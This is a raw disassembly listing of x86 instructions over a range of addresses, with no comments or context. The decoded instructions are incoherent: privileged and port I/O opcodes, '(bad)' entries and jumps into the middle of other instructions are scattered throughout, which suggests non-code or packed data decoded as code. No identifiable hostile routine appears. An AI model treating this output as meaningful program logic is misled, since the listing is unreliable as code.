  432817:	2b 78 b2             	sub    -0x4e(%eax),%edi
  43281a:	3f                   	aas
  43281b:	fb                   	sti
  43281c:	6c                   	insb   (%dx),%es:(%edi)
  43281d:	e6 05                	out    %al,$0x5
  43281f:	7d 24                	jge    0x432845
  432821:	e3 4c                	jecxz  0x43286f
  432823:	50                   	push   %eax
  432824:	c4 90 7a 91 7a b6    	les    -0x49856e86(%eax),%edx
  43282a:	ab                   	stos   %eax,%es:(%edi)
  43282b:	6d                   	insl   (%dx),%es:(%edi)
  43282c:	3d dc d8 e0 97       	cmp    $0x97e0d8dc,%eax
  432831:	2c 9d                	sub    $0x9d,%al
  432833:	43                   	inc    %ebx
  432834:	7b ce                	jnp    0x432804
  432836:	21 27                	and    %esp,(%edi)
  432838:	d3 21                	shll   %cl,(%ecx)
  43283a:	fd                   	std
  43283b:	6d                   	insl   (%dx),%es:(%edi)
  43283c:	64 f2 c9             	fs repnz leave
  43283f:	63 70 35             	arpl   %esi,0x35(%eax)
  432842:	3a 42 3c             	cmp    0x3c(%edx),%al
  432845:	e0 6c                	loopne 0x4328b3
  432847:	ab                   	stos   %eax,%es:(%edi)
  432848:	fc                   	cld
  432849:	1c 00                	sbb    $0x0,%al
  43284b:	31 b4 d3 7b 15 b9 3d 	xor    %esi,0x3db9157b(%ebx,%edx,8)
  432852:	97                   	xchg   %eax,%edi
  432853:	d2 81 98 d9 3c ee    	rolb   %cl,-0x11c32668(%ecx)
  432859:	bd 0b 62 0a 85       	mov    $0x850a620b,%ebp
  43285e:	f4                   	hlt
  43285f:	de 1a                	ficomps (%edx)
  432861:	f2 45                	repnz inc %ebp
  432863:	e2 6e                	loop   0x4328d3
  432865:	85 a4 50 42 0a b2 2c 	test   %esp,0x2cb20a42(%eax,%edx,2)
  43286c:	c8 93 c5 2c          	enter  $0xc593,$0x2c
  432870:	2b 4b 2f             	sub    0x2f(%ebx),%ecx
  432873:	82 38 f9             	cmpb   $0xf9,(%eax)
  432876:	99                   	cltd
  432877:	d2 7f f2             	sarb   %cl,-0xe(%edi)
  43287a:	b0 91                	mov    $0x91,%al
  43287c:	d7                   	xlat   %ds:(%ebx)
  43287d:	3d f2 37 7a 20       	cmp    $0x207a37f2,%eax
  432882:	74 0a                	je     0x43288e
  432884:	91                   	xchg   %eax,%ecx
  432885:	81 42 6f ec 7d b0 02 	addl   $0x2b07dec,0x6f(%edx)
  43288c:	eb bd                	jmp    0x43284b
  43288e:	3d ef 33 ee 6b       	cmp    $0x6bee33ef,%eax
  432893:	30 37                	xor    %dh,(%edi)
  432895:	09 53 05             	or     %edx,0x5(%ebx)
  432898:	56                   	push   %esi
  432899:	86 bc 0f d6 91 17 d8 	xchg   %bh,-0x27e86e2a(%edi,%ecx,1)
  4328a0:	24 d8                	and    $0xd8,%al
  4328a2:	4b                   	dec    %ebx
  4328a3:	67 40                	addr16 inc %eax
  4328a5:	8d 42 da             	lea    -0x26(%edx),%eax
  4328a8:	12 37                	adc    (%edi),%dh
  4328aa:	da 70 0d             	fidivl 0xd(%eax)
  4328ad:	d7                   	xlat   %ds:(%ebx)
  4328ae:	0c 9d                	or     $0x9d,%al
  4328b0:	e6 3b                	out    %al,$0x3b
  4328b2:	a0 0a 83 92 48       	mov    0x4892830a,%al
  4328b7:	78 96                	js     0x43284f
  4328b9:	b0 1d                	mov    $0x1d,%al
  4328bb:	99                   	cltd
  4328bc:	09 63 d6             	or     %esp,-0x2a(%ebx)
  4328bf:	f5                   	cmc
  4328c0:	3f                   	aas
  4328c1:	2b 3b                	sub    (%ebx),%edi
  4328c3:	be e4 3a 26 ab       	mov    $0xab263ae4,%esi
  4328c8:	aa                   	stos   %al,%es:(%edi)
  4328c9:	35 29 e1 b1 18       	xor    $0x18b1e129,%eax
  4328ce:	64 6d                	fs insl (%dx),%es:(%edi)
  4328d0:	2c 35                	sub    $0x35,%al
  4328d2:	e0 69                	loopne 0x43293d
  4328d4:	2a e2                	sub    %dl,%ah
  4328d6:	6d                   	insl   (%dx),%es:(%edi)
  4328d7:	f8                   	clc
  4328d8:	da a0 c7 6b 07 db    	fisubl -0x24f89439(%eax)
  4328de:	bc e4 b6 41 04       	mov    $0x441b6e4,%esp
  4328e3:	ef                   	out    %eax,(%dx)
  4328e4:	3b 61 7d             	cmp    0x7d(%ecx),%esp
  4328e7:	1b c0                	sbb    %eax,%eax
  4328e9:	f2 6a 0f             	repnz push $0xf
  4328ec:	bc e3 18 0e be       	mov    $0xbe0e18e3,%esp
  4328f1:	e7 fb                	out    %eax,$0xfb
  4328f3:	f9                   	stc
  4328f4:	35 9d e4 78 e1       	xor    $0xe178e49d,%eax
  4328f9:	73 2e                	jae    0x432929
  4328fb:	64 79 48             	fs jns 0x432946
  4328fe:	d9 c7                	fld    %st(7)
  432900:	bc f2 1f fb f9       	mov    $0xf9fb1ff2,%esp
  432905:	9a c2 a2 48 cc 7b e6 	lcall  $0xe67b,$0xcc48a2c2
  43290c:	ad                   	lods   %ds:(%esi),%eax
  43290d:	7e 8c                	jle    0x43289b
  43290f:	b6 b7                	mov    $0xb7,%dh
  432911:	26 50                	es push %eax
  432913:	66 35 b8 7e          	xor    $0x7eb8,%ax
  432917:	dc 5a b7             	fcompl -0x49(%edx)
  43291a:	5e                   	pop    %esi
  43291b:	80 30 7b             	xorb   $0x7b,(%eax)
  43291e:	13 fd                	adc    %ebp,%edi
  432920:	24 e5                	and    $0xe5,%al
  432922:	6a 79                	push   $0x79
  432924:	fa                   	cli
  432925:	fa                   	cli
  432926:	5e                   	pop    %esi
  432927:	36 e4 9f             	ss in  $0x9f,%al
  43292a:	6f                   	outsl  %ds:(%esi),(%dx)
  43292b:	17                   	pop    %ss
  43292c:	31 70 5b             	xor    %esi,0x5b(%eax)
  43292f:	2c 7b                	sub    $0x7b,%al
  432931:	ed                   	in     (%dx),%eax
  432932:	f3 21 43 50          	repz and %eax,0x50(%ebx)
  432936:	17                   	pop    %ss
  432937:	e1 f2                	loope  0x43292b
  432939:	d0 3c c0             	sarb   $1,(%eax,%eax,8)
  43293c:	e9 ce 99 8f c0       	jmp    0xc0d2c30f
  432941:	56                   	push   %esi
  432942:	b0 02                	mov    $0x2,%al
  432944:	75 15                	jne    0x43295b
  432946:	68 96 2b cc c2       	push   $0xc2cc2b96
  43294b:	92                   	xchg   %eax,%edx
  43294c:	34 b4                	xor    $0xb4,%al
  43294e:	b5 ca                	mov    $0xca,%ch
  432950:	0b 0f                	or     (%edi),%ecx
  432952:	33 df                	xor    %edi,%ebx
  432954:	25 5c 00 c2 91       	and    $0x91c2005c,%eax
  432959:	3a 7a 94             	cmp    -0x6c(%edx),%bh
  43295c:	9b                   	fwait
  43295d:	63 20                	arpl   %esp,(%eax)
  43295f:	7b 4f                	jnp    0x4329b0
  432961:	57                   	push   %edi
  432962:	54                   	push   %esp
  432963:	27                   	daa
  432964:	da 37                	fidivl (%edi)
  432966:	a1 25 86 3f 18       	mov    0x183f8625,%eax
  43296b:	85 f7                	test   %esi,%edi
  43296d:	f1                   	int1
  43296e:	15 1c 0a 32 fe       	adc    $0xfe320a1c,%eax
  432973:	e2 85                	loop   0x4328fa
  432975:	37                   	aaa
  432976:	03 ef                	add    %edi,%ebp
  432978:	c6                   	(bad)
  432979:	be 16 ba 36 d0       	mov    $0xd036ba16,%esi
  43297e:	ad                   	lods   %ds:(%esi),%eax
  43297f:	68 e4 04 0e ec       	push   $0xec0e04e4
  432984:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  432985:	84 d4                	test   %dl,%ah
  432987:	3d de a6 ca 0d       	cmp    $0xdcaa6de,%eax
  43298c:	63 26                	arpl   %esp,(%esi)
  43298e:	de 1a                	ficomps (%edx)
  432990:	da 5b cc             	ficompl -0x34(%ebx)
  432993:	b6 db                	mov    $0xdb,%dh
  432995:	c1 10 33             	rcll   $0x33,(%eax)
  432998:	cd ad                	int    $0xad
  43299a:	19 1e                	sbb    %ebx,(%esi)
  43299c:	53                   	push   %ebx
  43299d:	63 8f 09 bb 88 6a    	arpl   %ecx,0x6a88bb09(%edi)
  4329a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4329a4:	97                   	xchg   %eax,%edi
  4329a5:	ea a8 43 70 1f 45 68 	ljmp   $0x6845,$0x1f7043a8
  4329ac:	51                   	push   %ecx
  4329ad:	88 6a 6e             	mov    %ch,0x6e(%edx)
  4329b0:	13 9b b3 26 19 02    	adc    0x21926b3(%ebx),%ebx
  4329b6:	39 25 70 7b 09 d3    	cmp    %esp,0xd3097b70
  4329bc:	44                   	inc    %esp
  4329bd:	b7 88                	mov    $0x88,%bh
  4329bf:	07                   	pop    %es
  4329c0:	28 0b                	sub    %cl,(%ebx)
  4329c2:	16                   	push   %ss
  4329c3:	71 1b                	jno    0x4329e0
  4329c5:	83 13 1b             	adcl   $0x1b,(%ebx)
  4329c8:	d8 05 19 fe ac dd    	fadds  0xddacfe19
  4329ce:	72 7b                	jb     0x432a4b
  4329d0:	af                   	scas   %es:(%edi),%eax
  4329d1:	71 e0                	jno    0x4329b3
  4329d3:	20 09                	and    %cl,(%ecx)
  4329d5:	e9 e0 d2 fc a7       	jmp    0xa83ffcba
  4329da:	e4 1e                	in     $0x1e,%al
  4329dc:	38 84 f9 d0 cf 17 34 	cmp    %al,0x3417cfd0(%ecx,%edi,8)
  4329e3:	bc e1 85 2e 72       	mov    $0x722e85e1,%esp
  4329e8:	46                   	inc    %esi
  4329e9:	5b                   	pop    %ebx
  4329ea:	46                   	inc    %esi
  4329eb:	c7                   	(bad)
  4329ec:	3f                   	aas
  4329ed:	23 2d 5a 1d 31 c1    	and    0xc1311d5a,%ebp
  4329f3:	a1 c7 65 c2 6d       	mov    0x6dc265c7,%eax
  4329f8:	5d                   	pop    %ebp
  4329f9:	04 00                	add    $0x0,%al
  4329fb:	02 d3                	add    %bl,%dl
  4329fd:	8a 46 23             	mov    0x23(%esi),%al
  432a00:	47                   	inc    %edi
  432a01:	8d 62 aa             	lea    -0x56(%edx),%esp
  432a04:	3d 03 62 6a 39       	cmp    $0x396a6203,%eax
  432a09:	c4 9d 83 03 6d 40    	les    0x406d0383(%ebp),%ebx
  432a0f:	21 a8 e9 29 89 8c    	and    %ebp,-0x7376d617(%eax)
  432a15:	d8 74 5c 82          	fdivs  -0x7e(%esp,%ebx,2)
  432a19:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  432a1a:	ef                   	out    %eax,(%dx)
  432a1b:	91                   	xchg   %eax,%ecx
  432a1c:	17                   	pop    %ss
  432a1d:	bf 19 8e 23 7a       	mov    $0x7a238e19,%edi
  432a22:	49                   	dec    %ecx
  432a23:	e6 5a                	out    %al,$0x5a
  432a25:	fc                   	cld
  432a26:	0e                   	push   %cs
  432a27:	96                   	xchg   %eax,%esi
  432a28:	08 51 3e             	or     %dl,0x3e(%ecx)
  432a2b:	cb                   	lret
  432a2c:	e6 3c                	out    %al,$0x3c
  432a2e:	09 eb                	or     %ebp,%ebx
  432a30:	b6 1f                	mov    $0x1f,%dh
  432a32:	95                   	xchg   %eax,%ebp
  432a33:	b8 20 37 1d 29       	mov    $0x291d3720,%eax
  432a38:	7c 31                	jl     0x432a6b
  432a3a:	58                   	pop    %eax
  432a3b:	36 f8                	ss clc
  432a3d:	ce                   	into
  432a3e:	be fc 01 57 8c       	mov    $0x8c5701fc,%esi
  432a43:	53                   	push   %ebx
  432a44:	bc a1 39 1b eb       	mov    $0xeb1b39a1,%esp
  432a49:	b0 7b                	mov    $0x7b,%al
  432a4b:	f8                   	clc
  432a4c:	87 67 ae             	xchg   %esp,-0x52(%edi)
  432a4f:	be 46 c6 e2 46       	mov    $0x46e2c646,%esi
  432a54:	72 73                	jb     0x432ac9
  432a56:	c8 cd f5 16          	enter  $0xf5cd,$0x16
  432a5a:	eb a2                	jmp    0x4329fe
  432a5c:	2b 64 ab 13          	sub    0x13(%ebx,%ebp,4),%esp
  432a60:	c0 d0 47             	rcl    $0x47,%al
  432a63:	82 3d 31 a3 7d 0b 2f 	cmpb   $0x2f,0xb7da331
  432a6a:	1c 77                	sbb    $0x77,%al
  432a6c:	84 94 ef 82 69 d3 64 	test   %dl,0x64d36982(%edi,%ebp,8)
  432a73:	9a 5f 68 f9 c7 f6 a0 	lcall  $0xa0f6,$0xc7f9685f
  432a7a:	3a 78 df             	cmp    -0x21(%eax),%bh
  432a7d:	b7 2b                	mov    $0x2b,%bh
  432a7f:	e7 df                	out    %eax,$0xdf
  432a81:	08 f8                	or     %bh,%al
  432a83:	e4 6a                	in     $0x6a,%al
  432a85:	ef                   	out    %eax,(%dx)
  432a86:	ff 23                	jmp    *(%ebx)
  432a88:	c3                   	ret
  432a89:	04 3c                	add    $0x3c,%al
  432a8b:	83 6f eb 4e          	subl   $0x4e,-0x15(%edi)
  432a8f:	2b 5f d6             	sub    -0x2a(%edi),%ebx
  432a92:	f0 3e 19 dc          	lock ds sbb %ebx,%esp
  432a96:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  432a97:	f6 97 df 01 e1 33    	notb   0x33e101df(%edi)
  432a9d:	da 51 fb             	ficoml -0x5(%ecx)
  432aa0:	0b 5a 2d             	or     0x2d(%edx),%ebx
  432aa3:	8e f1                	mov    %ecx,%?
  432aa5:	ba ed 2a c6 e0       	mov    $0xe0c62aed,%edx
  432aaa:	b4 08                	mov    $0x8,%ah
  432aac:	56                   	push   %esi
  432aad:	35 a1 6c 7b b3       	xor    $0xb37b6ca1,%eax
  432ab2:	7a 92                	jp     0x432a46
  432ab4:	4d                   	dec    %ebp
  432ab5:	9c                   	pushf
  432ab6:	43                   	inc    %ebx
  432ab7:	b0 a2                	mov    $0xa2,%al
  432ab9:	45                   	inc    %ebp
  432aba:	22 f6                	and    %dh,%dh
  432abc:	97                   	xchg   %eax,%edi
  432abd:	44                   	inc    %esp
  432abe:	ad                   	lods   %ds:(%esi),%eax
  432abf:	ca 99 88             	lret   $0x8899
  432ac2:	5a                   	pop    %edx
  432ac3:	1e                   	push   %ds
  432ac4:	72 ce                	jb     0x432a94
  432ac6:	1c 51                	sbb    $0x51,%al
  432ac8:	f9                   	stc
  432ac9:	f3 1c e3             	repz sbb $0xe3,%al
  432acc:	f0 53                	lock push %ebx
  432ace:	7e 1f                	jle    0x432aef
  432ad0:	94                   	xchg   %eax,%esp
  432ad1:	99                   	cltd
  432ad2:	3c 0f                	cmp    $0xf,%al
  432ad4:	47                   	inc    %edi
  432ad5:	e0 de                	loopne 0x432ab5
  432ad7:	c6                   	(bad)
  432ad8:	3c 41                	cmp    $0x41,%al
  432ada:	8e ca                	mov    %edx,%cs
  432adc:	1b 91 91 a1 65 59    	sbb    0x5965a191(%ecx),%edx
  432ae2:	a1 9c aa 06 ac       	mov    0xac06aa9c,%eax
  432ae7:	7a af                	jp     0x432a98
  432ae9:	21 0d 82 b0 4d ad    	and    %ecx,0xad4db082
  432aef:	1f                   	pop    %ds
  432af0:	c7 85 37 b4 24 09 cd 	movl   $0x30fce2cd,0x924b437(%ebp)
  432af7:	e2 fc 30 
  432afa:	b0 99                	mov    $0x99,%al
  432afc:	45                   	inc    %ebp
  432afd:	92                   	xchg   %eax,%edx
  432afe:	3b 37                	cmp    (%edi),%esi
  432b00:	d5 b3                	aad    $0xb3
  432b02:	52                   	push   %edx
  432b03:	da 7b 9b             	fidivrl -0x65(%ebx)
  432b06:	30 44 ea bd          	xor    %al,-0x43(%edx,%ebp,8)
  432b0a:	40                   	inc    %eax
  432b0b:	0d bb 94 f9 fc       	or     $0xfcf994bb,%eax
  432b10:	27                   	daa
  432b11:	4e                   	dec    %esi
  432b12:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  432b13:	3c 2a                	cmp    $0x2a,%al
  432b15:	86 b0 88 db 1a ae    	xchg   %dh,-0x51e52478(%eax)
  432b1b:	78 93                	js     0x432ab0
  432b1d:	f4                   	hlt
  432b1e:	b7 8f                	mov    $0x8f,%bh
  432b20:	41                   	inc    %ecx
  432b21:	7c c1                	jl     0x432ae4
  432b23:	58                   	pop    %eax
  432b24:	d2 6a b0             	shrb   %cl,-0x50(%edx)
  432b27:	2d c2 57 39 40       	sub    $0x403957c2,%eax
  432b2c:	2d a2 31 6c c8       	sub    $0xc86c31a2,%eax
  432b31:	25 77 d1 d7 d9       	and    $0xd9d7d177,%eax
  432b36:	38 b3 bd 61 2d 64    	cmp    %dh,0x642d61bd(%ebx)
  432b3c:	60                   	pusha
  432b3d:	11 01                	adc    %eax,(%ecx)
  432b3f:	8f                   	(bad)
  432b40:	22 75 3c             	and    0x3c(%ebp),%dh
  432b43:	ca ea aa             	lret   $0xaaea
  432b46:	ea 29 de 1b 6e 29 8b 	ljmp   $0x8b29,$0x6e1bde29
  432b4d:	81 e6 fd 5b 2f 0c    	and    $0xc2f5bfd,%esi
  432b53:	b0 4e                	mov    $0x4e,%al
  432b55:	79 fc                	jns    0x432b53
  432b57:	95                   	xchg   %eax,%ebp
  432b58:	68 77 64 4a 5b       	push   $0x5b4a6477
  432b5d:	d6                   	salc
  432b5e:	0c ae                	or     $0xae,%al
  432b60:	8f                   	(bad)
  432b61:	3f                   	aas
  432b62:	42                   	inc    %edx
  432b63:	5d                   	pop    %ebp
  432b64:	ee                   	out    %al,(%dx)
  432b65:	99                   	cltd
  432b66:	db b5 b6 91 8e 4d    	(bad) 0x4d8e91b6(%ebp)
  432b6c:	fc                   	cld
  432b6d:	60                   	pusha
  432b6e:	16                   	push   %ss
  432b6f:	d8 39                	fdivrs (%ecx)
  432b71:	09 86 f3 56 46 0c    	or     %eax,0xc4656f3(%esi)
  432b77:	8b 99 1c 67 9a 4a    	mov    0x4a9a671c(%ecx),%ebx
  432b7d:	ee                   	out    %al,(%dx)
  432b7e:	39 5b 40             	cmp    %ebx,0x40(%ebx)
  432b81:	da cd                	fcmove %st(5),%st
  432b83:	27                   	daa
  432b84:	df 24 37             	fbld   (%edi,%esi,1)
  432b87:	6d                   	insl   (%dx),%es:(%edi)
  432b88:	2c 6f                	sub    $0x6f,%al
  432b8a:	0f a1                	pop    %fs
  432b8c:	c8 6f 20 32          	enter  $0x206f,$0x32
  432b90:	d8 e6                	fsub   %st(6),%st
  432b92:	fb                   	sti
  432b93:	cc                   	int3
  432b94:	d1 0a                	rorl   $1,(%edx)
  432b96:	bc d0 29 78 1f       	mov    $0x1f7829d0,%esp
  432b9b:	dd fe                	(bad)
  432b9d:	f0 0d 35 7b 9b 59    	lock or $0x599b7b35,%eax
  432ba3:	80 a2 bf 8a 33 38 77 	andb   $0x77,0x38338abf(%edx)
  432baa:	a8 c1                	test   $0xc1,%al
  432bac:	a8 79                	test   $0x79,%al
  432bae:	3f                   	aas
  432baf:	47                   	inc    %edi
  432bb0:	50                   	push   %eax
  432bb1:	c4 a8 26 92 5d 2c    	les    0x2c5d9226(%eax),%ebp
  432bb7:	79 b6                	jns    0x432b6f
  432bb9:	74 29                	je     0x432be4
  432bbb:	65 8f                	gs (bad)
  432bbd:	8f 47 b2             	pop    -0x4e(%edi)
  432bc0:	b9 56 f7 61 7b       	mov    $0x7b61f756,%ecx
  432bc5:	00 de                	add    %bl,%dh
  432bc7:	d7                   	xlat   %ds:(%ebx)
  432bc8:	93                   	xchg   %eax,%ebx
  432bc9:	8a 1a                	mov    (%edx),%bl
  432bcb:	14 9a                	adc    $0x9a,%al
  432bcd:	d4 9c                	aam    $0x9c
  432bcf:	6c                   	insb   (%dx),%es:(%edi)
  432bd0:	ac                   	lods   %ds:(%esi),%al
  432bd1:	52                   	push   %edx
  432bd2:	a9 7f 6f 4a 03       	test   $0x34a6f7f,%eax
  432bd7:	55                   	push   %ebp
  432bd8:	1c 50                	sbb    $0x50,%al
  432bda:	4c                   	dec    %esp
  432bdb:	b0 d0                	mov    $0xd0,%al
  432bdd:	d9 21                	fldenv (%ecx)
  432bdf:	67 f1                	addr16 int1
  432be1:	f2 30 9e f8 12 f4 6a 	repnz xor %bl,0x6af412f8(%esi)
  432be8:	67 18 85 89 db       	sbb    %al,-0x2477(%di)
  432bed:	f2 25 68 5e d2 61    	repnz and $0x61d25e68,%eax
  432bf3:	92                   	xchg   %eax,%edx
  432bf4:	c4 e5 89 ec          	(bad)
  432bf8:	37                   	aaa
  432bf9:	64 df cd             	fs (bad)
  432bfc:	da e8                	(bad)
  432bfe:	1e                   	push   %ds
  432bff:	3b ff                	cmp    %edi,%edi
  432c01:	bf ee 04 b9 dd       	mov    $0xddb904ee,%edi
  432c06:	d1 5a 87             	rcrl   $1,-0x79(%edx)
  432c09:	4c                   	dec    %esp
  432c0a:	e6 64                	out    %al,$0x64
  432c0c:	91                   	xchg   %eax,%ecx
  432c0d:	52                   	push   %edx
  432c0e:	ab                   	stos   %eax,%es:(%edi)
  432c0f:	f9                   	stc
  432c10:	3e f8                	ds clc
  432c12:	72 a9                	jb     0x432bbd
  432c14:	9e                   	sahf
  432c15:	9a f5 d8 8f e1 65 f0 	lcall  $0xf065,$0xe18fd8f5
  432c1c:	6a 99                	push   $0xffffff99
  432c1e:	1a 0e                	sbb    (%esi),%cl
  432c20:	d4 46                	aam    $0x46
  432c22:	f3 be 88 fc 9a 84    	repz mov $0x849afc88,%esi
  432c28:	2f                   	das
  432c29:	d3 9e d3 cf 98 5c    	rcrl   %cl,0x5c98cfd3(%esi)
  432c2f:	c0 b1 5b e1 31 84 b5 	shlb   $0xb5,-0x7bce1ea5(%ecx)
  432c36:	85 45 df             	test   %eax,-0x21(%ebp)
  432c39:	cd f6                	int    $0xf6
  432c3b:	54                   	push   %esp
  432c3c:	c2 5b e8             	ret    $0xe85b
  432c3f:	f9                   	stc
  432c40:	cd c4                	int    $0xc4
  432c42:	e5 1f                	in     $0x1f,%eax
  432c44:	2b e3                	sub    %ebx,%esp
  432c46:	8e 2b                	mov    (%ebx),%gs
  432c48:	15 e7 ae 72 70       	adc    $0x7072aee7,%eax
  432c4d:	36 c6                	ss (bad)
  432c4f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  432c50:	a8 f6                	test   $0xf6,%al
  432c52:	16                   	push   %ss
  432c53:	21 59 75             	and    %ebx,0x75(%ecx)
  432c56:	cf                   	iret
  432c57:	1f                   	pop    %ds
  432c58:	02 61 6c             	add    0x6c(%ecx),%ah
  432c5b:	5b                   	pop    %ebx
  432c5c:	f6 95 ba 37 25 d2    	notb   -0x2ddac846(%ebp)
  432c62:	49                   	dec    %ecx
  432c63:	43                   	inc    %ebx
  432c64:	95                   	xchg   %eax,%ebp
  432c65:	16                   	push   %ss
  432c66:	2e ef                	cs out %eax,(%dx)
  432c68:	95                   	xchg   %eax,%ebp
  432c69:	e0 cf                	loopne 0x432c3a
  432c6b:	80 62 79 c9          	andb   $0xc9,0x79(%edx)
  432c6f:	cc                   	int3
  432c70:	b1 60                	mov    $0x60,%cl
  432c72:	6d                   	insl   (%dx),%es:(%edi)
  432c73:	9d                   	popf
  432c74:	ba 9b 82 30 16       	mov    $0x1630829b,%edx
  432c79:	d1 28                	shrl   $1,(%eax)
  432c7b:	3d b3 93 b3 15       	cmp    $0x15b393b3,%eax
  432c80:	80 7f 02 a2          	cmpb   $0xa2,0x2(%edi)
  432c84:	06                   	push   %es
  432c85:	d2 b9 98 9e 14 c1    	sarb   %cl,-0x3eeb6168(%ecx)
  432c8b:	38 40 1d             	cmp    %al,0x1d(%eax)
  432c8e:	99                   	cltd
  432c8f:	8f c6                	pop    %esi
  432c91:	c2 f0 e8             	ret    $0xe8f0
  432c94:	f7 68 91             	imull  -0x6f(%eax)
  432c97:	df ae e1 d8 09 4e    	fildll 0x4e09d8e1(%esi)
  432c9d:	46                   	inc    %esi
  432c9e:	b4 99                	mov    $0x99,%ah
  432ca0:	44                   	inc    %esp
  432ca1:	bd e5 43 ce 86       	mov    $0x86ce43e5,%ebp
  432ca6:	88 d8                	mov    %bl,%al
  432ca8:	41                   	inc    %ecx
  432ca9:	77 fe                	ja     0x432ca9
  432cab:	64 54                	fs push %esp
  432cad:	1c 0d                	sbb    $0xd,%al
  432caf:	92                   	xchg   %eax,%edx
  432cb0:	65 07                	gs pop %es
  432cb2:	61                   	popa
  432cb3:	8f c1                	pop    %ecx
  432cb5:	24 0f                	and    $0xf,%al
  432cb7:	ba 81 e3 16 39       	mov    $0x3916e381,%edx
  432cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  432cbd:	d6                   	salc
  432cbe:	5a                   	pop    %edx
  432cbf:	9e                   	sahf
  432cc0:	14 b9                	adc    $0xb9,%al
  432cc2:	f9                   	stc
  432cc3:	8d 5f 16             	lea    0x16(%edi),%ebx
  432cc6:	bc 99 70 3b a4       	mov    $0xa43b7099,%esp
  432ccb:	61                   	popa
  432ccc:	a9 23 af d4 d9       	test   $0xd9d4af23,%eax
  432cd1:	32 58 0b             	xor    0xb(%eax),%bl
  432cd4:	96                   	xchg   %eax,%esi
  432cd5:	ac                   	lods   %ds:(%esi),%al
  432cd6:	b3 e8                	mov    $0xe8,%bl
  432cd8:	13 81 ed 94 6b 24    	adc    0x246b94ed(%ecx),%eax
  432cde:	bc 37 68 63 a0       	mov    $0xa0636837,%esp
  432ce3:	a9 fd f2 b5 5d       	test   $0x5db5f2fd,%eax
  432ce8:	1c 51                	sbb    $0x51,%al
  432cea:	1b d4                	sbb    %esp,%edx
  432cec:	1d ed 0f 10 89       	sbb    $0x89100fed,%eax
  432cf1:	97                   	xchg   %eax,%edi
  432cf2:	38 7e f8             	cmp    %bh,-0x8(%esi)
  432cf5:	07                   	pop    %es
  432cf6:	8e ed                	mov    %ebp,%gs
  432cf8:	37                   	aaa
  432cf9:	c3                   	ret
  432cfa:	1d de f3 bc 97       	sbb    $0x97bcf3de,%eax
  432cff:	f8                   	clc
  432d00:	75 c3                	jne    0x432cc5
  432d02:	bf 84 39 c6 d7       	mov    $0xd7c63984,%edi
  432d07:	1f                   	pop    %ds
  432d08:	c3                   	ret
  432d09:	f0 2c d8             	lock sub $0xd8,%al
  432d0c:	0f 0e                	femms
  432d0e:	eb 7c                	jmp    0x432d8c
  432d10:	25 3e cd 81 a3       	and    $0xa381cd3e,%eax
  432d15:	69 df c7 b2 45 97    	imul   $0x9745b2c7,%edi,%ebx
  432d1b:	9b                   	fwait
  432d1c:	c9                   	leave
  432d1d:	95                   	xchg   %eax,%ebp
  432d1e:	0b 5d e0             	or     -0x20(%ebp),%ebx
  432d21:	31 0a                	xor    %ecx,(%edx)
  432d23:	69 94 11 2d 72 83 a0 	imul   $0xffe0ac9c,-0x5f7c8dd3(%ecx,%edx,1),%edx
  432d2a:	9c ac e0 ff 
  432d2e:	89 4c a9 b5          	mov    %ecx,-0x4b(%ecx,%ebp,4)
  432d32:	ad                   	lods   %ds:(%esi),%eax
  432d33:	b9 01 26 71 bc       	mov    $0xbc712601,%ecx
  432d38:	7c f4                	jl     0x432d2e
  432d3a:	f7 c2 3f 66 20 b6    	test   $0xb620663f,%edx
  432d40:	a2 18 19 ea 97       	mov    %al,0x97ea1918
  432d45:	d5 2b                	aad    $0x2b
  432d47:	55                   	push   %ebp
  432d48:	e7 8a                	out    %eax,$0x8a
  432d4a:	c5 e8 35             	(bad)
  432d4d:	63 54 a4 38          	arpl   %edx,0x38(%esp,%eiz,4)
  432d51:	d3 04 4c             	roll   %cl,(%esp,%ecx,2)
  432d54:	1c ad                	sbb    $0xad,%al
  432d56:	d6                   	salc
  432d57:	41                   	inc    %ecx
  432d58:	73 ca                	jae    0x432d24
  432d5a:	07                   	pop    %es
  432d5b:	e9 81 49 c0 87       	jmp    0x880376e1
  432d60:	08 3a                	or     %bh,(%edx)
  432d62:	5a                   	pop    %edx
  432d63:	bd 36 be 76 4e       	mov    $0x4e76be36,%ebp
  432d68:	81 e7 57 51 b2 8e    	and    $0x8eb25157,%edi
  432d6e:	75 14                	jne    0x432d84
  432d70:	b2 50                	mov    $0x50,%dl
  432d72:	4c                   	dec    %esp
  432d73:	7e e9                	jle    0x432d5e
  432d75:	06                   	push   %es
  432d76:	ab                   	stos   %eax,%es:(%edi)
  432d77:	d1 80 26 84 0c 4f    	roll   $1,0x4f0c8426(%eax)
  432d7d:	bd 8b d3 3f c3       	mov    $0xc33fd38b,%ebp
  432d82:	84 fa                	test   %bh,%dl
  432d84:	45                   	inc    %ebp
  432d85:	aa                   	stos   %al,%es:(%edi)
  432d86:	02 47 7f             	add    0x7f(%edi),%al
  432d89:	6a d3                	push   $0xffffffd3
  432d8b:	13 2c d0             	adc    (%eax,%edx,8),%ebp
  432d8e:	cf                   	iret
  432d8f:	68 ee 8a 98 34       	push   $0x34988aee
  432d94:	30 7f d0             	xor    %bh,-0x30(%edi)
  432d97:	5b                   	pop    %ebx
  432d98:	f0 a7                	lock cmpsl %es:(%edi),%ds:(%esi)
  432d9a:	bd 78 ba 63 82       	mov    $0x8263ba78,%ebp
  432d9f:	34 c2                	xor    $0xc2,%al
  432da1:	da b3 38 5f 0d 8e    	fidivl -0x71f2a0c8(%ebx)
  432da7:	1d 4b 71 ca cc       	sbb    $0xccca714b,%eax
  432dac:	c0 83 0d cd d5 1f 09 	rolb   $0x9,0x1fd5cd0d(%ebx)
  432db3:	48                   	dec    %eax
  432db4:	b2 55                	mov    $0x55,%dl
  432db6:	52                   	push   %edx
  432db7:	f3 7a 70             	repz jp 0x432e2a
  432dba:	37                   	aaa
  432dbb:	94                   	xchg   %eax,%esp
  432dbc:	92                   	xchg   %eax,%edx
  432dbd:	00 68 ac             	add    %ch,-0x54(%eax)
  432dc0:	23 8a e1 48 b8 c0    	and    -0x3f47b71f(%edx),%ecx
  432dc6:	5b                   	pop    %ebx
  432dc7:	2f                   	das
  432dc8:	2a 0f                	sub    (%edi),%cl
